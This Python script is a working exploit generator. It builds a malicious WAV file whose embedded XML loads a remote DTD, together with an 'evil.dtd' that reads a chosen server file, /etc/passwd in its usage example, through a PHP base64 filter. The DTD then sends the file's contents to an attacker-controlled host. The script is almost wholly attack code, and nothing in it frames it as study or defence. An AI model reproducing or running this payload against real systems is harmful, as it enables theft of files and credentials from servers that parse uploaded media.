#!/usr/bin/python3

import os
import sys


def init():
    
    if len(sys.argv) < 3:
        print("[!]Require: arguments")
        print(f"{sys.argv[0]} <host:port> <file_path>")
        print(f"{sys.argv[0]} 127.0.0.1:8000 /etc/passwd")
        
        sys.exit(1)
    
    return sys.argv[1],sys.argv[2]


def dtd_payload_gen(host, file_path):
    
    dtd_payload = """
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource={1}">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://{2}/?p=%file;'>" >
"""

    dtd_payload = dtd_payload.replace("{1}",file_path)
    dtd_payload = dtd_payload.replace("{2}",host)
    

    with open("evil.dtd", "w", encoding="utf-8") as f:
        f.write(dtd_payload)

    print("[+] evil.dtd file genratated") 
    


def wav_payload_gen(host):

    payload_str = (
    f'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00'
    f'<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '
    f"'http://{host}/evil.dtd'>%remote;%init;%trick;]>\x00"
)

    payload = payload_str.encode('latin-1')

    with open("payload.wav", "wb") as f:
        f.write(payload)

    print("[+] payload.wav generated!")

def main():
    
    host, file_path = init()
    dtd_payload_gen(host, file_path)
    wav_payload_gen(host)

if __name__ == "__main__":

    main()

    



